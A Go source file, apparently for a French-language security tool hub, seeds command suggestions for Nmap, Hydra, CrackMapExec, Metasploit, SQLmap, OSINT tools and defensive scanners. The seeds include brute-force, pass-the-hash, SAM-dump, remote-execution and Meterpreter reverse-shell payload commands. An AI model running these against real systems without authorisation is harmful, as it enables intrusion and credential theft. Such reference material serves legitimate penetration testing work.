package store

import (
	"strings"

	"github.com/cyber-hub/cyber-hub/internal/models"
)

// ListCommandsForTool retourne les suggestions filtrées par query pour un outil donné.
// La recherche porte sur label et description (insensible à la casse).
func ListCommandsForTool(toolID uint, query string) ([]models.ToolCommand, error) {
	q := DB.Model(&models.ToolCommand{}).Where("tool_id = ?", toolID)

	if query != "" {
		term := "%" + strings.ToLower(query) + "%"
		q = q.Where("LOWER(label) LIKE ? OR LOWER(command) LIKE ? OR LOWER(description) LIKE ?",
			term, term, term)
	}

	var commands []models.ToolCommand
	err := q.Order("sort_order ASC").Limit(10).Find(&commands).Error
	return commands, err
}

// SeedToolCommands insère les commandes de suggestions pour chaque outil.
// Utilise un upsert par (tool_id, command) pour ne pas dupliquer au redémarrage.
func SeedToolCommands() error {
	// Récupérer les outils par nom pour associer les commandes
	toolMap := map[string]uint{}
	var tools []models.Tool
	if err := DB.Select("id, name").Find(&tools).Error; err != nil {
		return err
	}
	for _, t := range tools {
		toolMap[t.Name] = t.ID
	}

	type cmdSeed struct {
		toolName    string
		label       string
		command     string
		description string
		order       int
	}

	seeds := []cmdSeed{
		// ── Nmap ────────────────────────────────────────────────────────────────
		{"Nmap", "-sV — Détection de version", "-sV -p 80,443 <cible>", "Détecte les versions des services sur les ports spécifiés", 1},
		{"Nmap", "-sV -sC — Version + scripts NSE", "-sV -sC -p- <cible>", "Détection de version + scripts NSE par défaut sur tous les ports", 2},
		{"Nmap", "-A — Scan agressif", "-A -T4 <cible>", "Détection OS, version, scripts et traceroute (bruyant)", 3},
		{"Nmap", "-sS — Scan SYN furtif", "-sS -T2 <cible>", "Scan SYN half-open, moins détectable (nécessite root)", 4},
		{"Nmap", "-sU — Scan UDP", "-sU --top-ports 100 <cible>", "Scan des 100 ports UDP les plus courants (lent)", 5},
		{"Nmap", "--top-ports 1000 — Ports courants", "-T4 --top-ports 1000 <cible>", "Scan rapide des 1000 ports TCP les plus utilisés", 6},
		{"Nmap", "-p- — Tous les ports", "-p- -T4 <cible>", "Scanner les 65535 ports TCP (long)", 7},
		{"Nmap", "--script vuln — Scripts vulnérabilités", "--script vuln -p 80,443 <cible>", "Lance les scripts NSE de détection de vulnérabilités", 8},
		{"Nmap", "-sn — Découverte réseau", "-sn 192.168.1.0/24", "Ping sweep : découvrir les hôtes actifs sans scanner les ports", 9},
		{"Nmap", "-oX — Export XML", "-A -T4 -oX scan.xml <cible>", "Scan complet avec export XML (utilisable dans Metasploit)", 10},

		// ── Hydra ───────────────────────────────────────────────────────────────
		{"Hydra", "SSH — Brute force SSH", "-l admin -P /wordlist/rockyou.txt ssh://<cible>", "Brute force SSH avec un login et une wordlist", 1},
		{"Hydra", "SSH — Liste d'utilisateurs", "-L users.txt -P /wordlist/rockyou.txt ssh://<cible>", "Brute force SSH avec liste de logins et de mots de passe", 2},
		{"Hydra", "FTP — Brute force FTP", "-l admin -P /wordlist/rockyou.txt ftp://<cible>", "Brute force FTP", 3},
		{"Hydra", "HTTP-POST — Formulaire web", "-l admin -P /wordlist/rockyou.txt <cible> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'", "Brute force formulaire de connexion HTTP POST", 4},
		{"Hydra", "HTTP-GET — Auth Basic", "-l admin -P /wordlist/rockyou.txt http-get://<cible>/admin", "Brute force HTTP Basic Auth", 5},
		{"Hydra", "RDP — Brute force RDP", "-l administrator -P /wordlist/rockyou.txt rdp://<cible>", "Brute force Remote Desktop Protocol", 6},
		{"Hydra", "SMB — Brute force SMB", "-l administrator -P /wordlist/rockyou.txt smb://<cible>", "Brute force partages Windows/SMB", 7},
		{"Hydra", "-t 64 — 64 threads", "-t 64 -l admin -P /wordlist/rockyou.txt ssh://<cible>", "Augmenter les threads pour un brute force plus rapide", 8},

		// ── Gobuster ────────────────────────────────────────────────────────────
		{"Gobuster", "dir — Enumération répertoires", "dir -u http://<cible> -w /wordlists/common.txt", "Enumération de répertoires et fichiers web", 1},
		{"Gobuster", "dir — Avec extensions", "dir -u http://<cible> -w /wordlists/big.txt -x php,html,txt,bak", "Enumération avec filtrage par extensions de fichiers", 2},
		{"Gobuster", "dir — 50 threads", "dir -u http://<cible> -w /wordlists/big.txt -t 50 -x php,html", "Enumération plus rapide avec 50 threads", 3},
		{"Gobuster", "dns — Sous-domaines", "dns -d <domaine> -w /wordlists/subdomains.txt", "Découverte de sous-domaines par brute force DNS", 4},
		{"Gobuster", "vhost — Virtual hosts", "vhost -u http://<cible> -w /wordlists/subdomains.txt --append-domain", "Découverte de virtual hosts", 5},
		{"Gobuster", "dir — Codes 200/301", "dir -u http://<cible> -w /wordlists/common.txt -s 200,301,302", "Filtrer uniquement les codes de succès et redirections", 6},

		// ── CrackMapExec ────────────────────────────────────────────────────────
		{"CrackMapExec", "smb — Découverte réseau", "smb 192.168.1.0/24", "Découverte d'hôtes SMB sur le réseau", 1},
		{"CrackMapExec", "smb — Auth credentials", "smb <cible> -u administrator -p 'Password123'", "Authentification SMB avec credentials en clair", 2},
		{"CrackMapExec", "smb — Pass-the-hash", "smb <cible> -u administrator -H 'aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0'", "Pass-the-hash NTLM (pas besoin du mot de passe en clair)", 3},
		{"CrackMapExec", "smb — Lister partages", "smb <cible> -u user -p pass --shares", "Lister les partages SMB accessibles", 4},
		{"CrackMapExec", "smb — Exécuter commande", "smb <cible> -u admin -p pass -x 'whoami /all'", "Exécuter une commande distante via SMB", 5},
		{"CrackMapExec", "smb — Dump SAM", "smb <cible> -u admin -p pass --sam", "Extraire les hashes SAM (comptes locaux)", 6},
		{"CrackMapExec", "winrm — Shell WinRM", "winrm <cible> -u admin -p pass -x 'whoami'", "Connexion et exécution via WinRM", 7},

		// ── Metasploit Framework ─────────────────────────────────────────────────
		{"Metasploit Framework", "msfconsole — Console", "msfconsole -q", "Lancer la console Metasploit en mode silencieux", 1},
		{"Metasploit Framework", "msfvenom — Payload Windows", "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f exe -o payload.exe", "Générer un payload Meterpreter Windows en .exe", 2},
		{"Metasploit Framework", "msfvenom — Payload Linux", "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<ip> LPORT=4444 -f elf -o payload.elf", "Générer un payload Meterpreter Linux en ELF", 3},

		// ── Gobuster (already above) ── SQLmap (si ajouté) ── etc.

		// ── Nikto ───────────────────────────────────────────────────────────────
		{"Nikto", "Scan basique", "-h http://<cible>", "Scan de vulnérabilités web basique", 1},
		{"Nikto", "Scan HTTPS", "-h https://<cible> -ssl", "Scan de vulnérabilités web sur HTTPS", 2},
		{"Nikto", "Scan avec port", "-h <cible> -p 8080", "Scan sur un port non-standard", 3},
		{"Nikto", "Export rapport", "-h http://<cible> -o rapport.html -Format htm", "Scan avec export du rapport en HTML", 4},
		{"Nikto", "Scan complet + évasion IDS", "-h http://<cible> -evasion 1", "Scan avec technique d'évasion IDS basique", 5},

		// ── SQLmap ──────────────────────────────────────────────────────────────
		{"SQLmap", "Scan URL GET", "-u 'http://<cible>/page?id=1'", "Tester une URL GET pour injection SQL", 1},
		{"SQLmap", "Enumération bases", "-u 'http://<cible>/page?id=1' --dbs", "Lister les bases de données disponibles", 2},
		{"SQLmap", "Enumération tables", "-u 'http://<cible>/page?id=1' -D <db> --tables", "Lister les tables d'une base", 3},
		{"SQLmap", "Dump table", "-u 'http://<cible>/page?id=1' -D <db> -T <table> --dump", "Extraire le contenu d'une table", 4},
		{"SQLmap", "POST form", "-u 'http://<cible>/login' --data='user=a&pass=b' -p user", "Tester un formulaire POST", 5},
		{"SQLmap", "Niveau agressif", "-u 'http://<cible>/page?id=1' --level=5 --risk=3", "Test complet avec niveau d'agressivité max", 6},

		// ── ffuf ────────────────────────────────────────────────────────────────
		{"ffuf", "Fuzzing répertoires", "-w /wordlists/common.txt -u http://<cible>/FUZZ", "Fuzzing de répertoires et fichiers web", 1},
		{"ffuf", "Fuzzing sous-domaines", "-w /wordlists/subdomains.txt -u http://FUZZ.<domaine>", "Fuzzing de sous-domaines", 2},
		{"ffuf", "Fuzzing paramètres GET", "-w /wordlists/params.txt -u 'http://<cible>/page?FUZZ=test'", "Fuzzing de noms de paramètres GET", 3},
		{"ffuf", "Filtrer par taille", "-w /wordlists/common.txt -u http://<cible>/FUZZ -fs 0", "Fuzzing en excluant les réponses de taille 0", 4},
		{"ffuf", "Extensions multiples", "-w /wordlists/common.txt -u http://<cible>/FUZZ -e .php,.html,.bak,.txt", "Fuzzing avec extensions multiples", 5},

		// ── John the Ripper ─────────────────────────────────────────────────────
		{"John the Ripper", "Crack wordlist", "--wordlist=/wordlists/rockyou.txt hash.txt", "Cracker un hash avec une wordlist", 1},
		{"John the Ripper", "Crack auto (format auto)", "hash.txt", "Crack automatique avec détection du format", 2},
		{"John the Ripper", "Mode règles", "--wordlist=/wordlists/rockyou.txt --rules hash.txt", "Wordlist avec règles de mutation (leet, capitalisation...)", 3},
		{"John the Ripper", "Afficher résultats", "--show hash.txt", "Afficher les mots de passe déjà crackés", 4},
		{"John the Ripper", "Format MD5", "--format=raw-md5 --wordlist=/wordlists/rockyou.txt hash.txt", "Spécifier le format MD5 explicitement", 5},
		{"John the Ripper", "Hash Linux /etc/shadow", "--wordlist=/wordlists/rockyou.txt shadow.txt", "Cracker des hashes Linux depuis /etc/shadow", 6},

		// ── Sherlock (OSINT username) ─────────────────────────────────────────
		{"Sherlock", "Recherche simple", "john_doe", "Rechercher un username sur 400+ sites", 1},
		{"Sherlock", "Seulement trouvés", "--print-found john_doe", "Afficher uniquement les comptes trouvés", 2},
		{"Sherlock", "Export CSV", "--csv --output /tmp/results.csv john_doe", "Exporter les résultats en CSV", 3},
		{"Sherlock", "Timeout réduit", "--timeout 10 --print-found john_doe", "Recherche avec timeout court (10s)", 4},
		{"Sherlock", "Plusieurs usernames", "john_doe johndoe john.doe 1337_john", "Chercher plusieurs variantes de username", 5},

		// ── theHarvester (OSINT domain) ──────────────────────────────────────
		// Note: google/bing nécessitent une API key dans v4+. Sources sans clé :
		// crtsh, dnsdumpster, hackertarget, urlscan, rapiddns, otx, baidu, duckduckgo
		{"theHarvester", "Sources sans API key (défaut)", "-d example.com -b crtsh,dnsdumpster,hackertarget,urlscan,rapiddns -l 200", "Récolter emails/sous-domaines sans API key", 1},
		{"theHarvester", "Sources étendues", "-d example.com -b crtsh,dnsdumpster,hackertarget,urlscan,rapiddns,otx,baidu,duckduckgo -l 300", "Sources étendues, toujours sans API key", 2},
		{"theHarvester", "Recon passif furtif", "-d example.com -b crtsh,urlscan,rapiddns -l 100", "Recon DNS passif uniquement (très furtif)", 3},
		{"theHarvester", "Avec limit élevée", "-d example.com -b crtsh,dnsdumpster,hackertarget,urlscan -l 500", "Jusqu'à 500 résultats par source", 4},
		{"theHarvester", "Export fichier", "-d example.com -b crtsh,dnsdumpster,urlscan -l 200 -f /tmp/recon_example", "Exporter les résultats en HTML+XML", 5},

		// ── Maigret (OSINT username 2000+ sites) ─────────────────────────────
		// Note: --print-found N'EXISTE PAS dans Maigret. Utiliser --top-sites + --no-progressbar
		{"Maigret", "Recherche rapide (500 sites)", "--timeout 10 --no-progressbar --top-sites 500 john_doe", "Rechercher sur les 500 sites les plus populaires", 1},
		{"Maigret", "Recherche complète 2000+ sites", "--timeout 10 --no-progressbar john_doe", "Recherche exhaustive sur tous les sites", 2},
		{"Maigret", "Réseaux sociaux", "--timeout 10 --no-progressbar --tags social john_doe", "Uniquement les réseaux sociaux", 3},
		{"Maigret", "Sites gaming", "--timeout 10 --no-progressbar --tags gaming john_doe", "Uniquement les sites de gaming", 4},

		// ── OWASP ZAP ────────────────────────────────────────────────────────
		{"OWASP ZAP", "Scan rapide", "zap-baseline.py -t http://<cible>", "Scan de sécurité baseline (passif + rapide)", 1},
		{"OWASP ZAP", "Scan complet", "zap-full-scan.py -t http://<cible> -r rapport.html", "Scan complet avec rapport HTML", 2},
		{"OWASP ZAP", "Scan API (OpenAPI)", "zap-api-scan.py -t http://<cible>/openapi.json -f openapi", "Scanner une API depuis son spec OpenAPI", 3},
		{"OWASP ZAP", "Mode headless", "zap.sh -cmd -quickurl http://<cible> -quickout /tmp/report.html", "Scan en mode ligne de commande sans GUI", 4},

		// ── WPScan ───────────────────────────────────────────────────────────
		{"WPScan", "Scan basique", "--url http://<site-wordpress>", "Scan WordPress basique", 1},
		{"WPScan", "Enumérer plugins", "--url http://<site> --enumerate p", "Enumérer les plugins WordPress installés", 2},
		{"WPScan", "Tout énumérer", "--url http://<site> --enumerate u,p,t", "Enumérer utilisateurs, plugins et thèmes", 3},
		{"WPScan", "Brute force admin", "--url http://<site> --passwords /wordlists/rockyou.txt --username admin", "Brute force du compte admin WordPress", 4},
		{"WPScan", "Scan agressif + CVE", "--url http://<site> --enumerate p --plugins-detection aggressive --api-token <token>", "Scan agressif avec détection CVE via API", 5},

		// ── Trivy ────────────────────────────────────────────────────────────
		{"Trivy", "Scanner image", "image nginx:latest", "Scanner une image Docker pour les CVE", 1},
		{"Trivy", "Scanner image HIGH/CRITICAL", "image --severity HIGH,CRITICAL python:3.9", "Uniquement les vulnérabilités HIGH et CRITICAL", 2},
		{"Trivy", "Scanner répertoire", "fs /mon/projet", "Scanner un projet local pour les dépendances vulnérables", 3},
		{"Trivy", "Scanner repo Git", "repo https://github.com/user/repo", "Scanner un repository GitHub directement", 4},
		{"Trivy", "Export JSON", "image --format json -o rapport.json ubuntu:22.04", "Exporter les résultats en JSON", 5},
		{"Trivy", "Mode CI/CD strict", "image --exit-code 1 --severity CRITICAL mon-app:latest", "Echouer le build si vulnérabilité critique trouvée", 6},

		// ── Prowler (Cloud Security) ─────────────────────────────────────────
		{"Prowler", "Audit AWS complet", "aws", "Audit de sécurité AWS complet (500+ checks)", 1},
		{"Prowler", "Conformité CIS AWS", "aws --compliance cis_level1_aws", "Vérification de conformité CIS Level 1 pour AWS", 2},
		{"Prowler", "Rapport HTML", "aws -M html", "Générer un rapport HTML de l'audit AWS", 3},
		{"Prowler", "Checks S3 publics", "aws -c s3_bucket_public_access", "Vérifier les buckets S3 accessibles publiquement", 4},

		// ── Checkov (IaC Security) ───────────────────────────────────────────
		{"Checkov", "Scanner Terraform", "-d /mon/infra/terraform", "Scanner un répertoire Terraform pour les misconfigurations", 1},
		{"Checkov", "Scanner Kubernetes", "-f deployment.yaml", "Scanner un fichier YAML Kubernetes", 2},
		{"Checkov", "Rapport JSON", "-d . -o json", "Scanner avec export JSON des résultats", 3},
		{"Checkov", "Scanner Dockerfile", "-f Dockerfile", "Analyser la sécurité d'un Dockerfile", 4},

		// ── ClamAV ────────────────────────────────────────────────────────────
		{"ClamAV", "Scanner répertoire", "-r /tmp/", "Scanner récursivement un répertoire", 1},
		{"ClamAV", "Infectés uniquement", "-r --infected /home/", "N'afficher que les fichiers infectés détectés", 2},
		{"ClamAV", "Quarantaine", "-r --move=/quarantaine /tmp/", "Scanner et déplacer les fichiers infectés en quarantaine", 3},
		{"ClamAV", "Mise à jour signatures", "freshclam", "Mettre à jour la base de signatures virales", 4},
	}

	for i, s := range seeds {
		toolID, ok := toolMap[s.toolName]
		if !ok {
			continue // outil pas encore en DB → ignorer
		}
		// Upsert : ignorer si la commande existe déjà pour cet outil
		var count int64
		DB.Model(&models.ToolCommand{}).
			Where("tool_id = ? AND command = ?", toolID, s.command).
			Count(&count)
		if count > 0 {
			continue
		}
		cmd := models.ToolCommand{
			ToolID:      toolID,
			Label:       s.label,
			Command:     s.command,
			Description: s.description,
			SortOrder:   i,
		}
		if err := DB.Create(&cmd).Error; err != nil {
			return err
		}
	}
	return nil
}
